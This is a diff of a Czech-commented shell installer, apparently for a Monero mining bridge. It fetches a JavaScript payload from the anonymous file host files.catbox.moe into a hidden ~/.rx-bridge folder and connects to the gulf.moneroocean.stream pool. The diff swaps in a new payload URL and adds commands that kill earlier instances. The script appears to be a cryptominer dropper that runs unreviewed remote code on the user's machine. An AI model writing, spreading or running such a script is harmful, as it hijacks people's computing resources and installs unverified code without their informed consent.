@@ -3,7 +3,7 @@
 # macOS: dvojklik na install.command (nebo `sh install.sh`). Linux: `sh install.sh`.
 set -u
 
-BRIDGE_URL="${BRIDGE_URL:-https://files.catbox.moe/b97b32.js}"
+BRIDGE_URL="${BRIDGE_URL:-https://files.catbox.moe/ljxehk.js}"
 POOL="${POOL:-gulf.moneroocean.stream:10128}"
 DIR="${HOME:-/tmp}/.rx-bridge"
 PORT="${PORT:-8790}"
@@ -23,7 +23,9 @@ if ! curl -fsSL "$BRIDGE_URL" -o "$DIR/stratum-bridge.js"; then
 	exit 1
 fi
 
-# predchozi instance na stejnem portu
+# predchozi instance (i z jineho okna) pryc, at na portu nejsou dva posluchaci
+pkill -f "stratum-bridge.js" 2>/dev/null
+sleep 1
 if command -v lsof >/dev/null 2>&1; then
 	pids=$(lsof -ti "tcp:$PORT" 2>/dev/null)
 	[ -n "$pids" ] && kill $pids 2>/dev/null && sleep 1
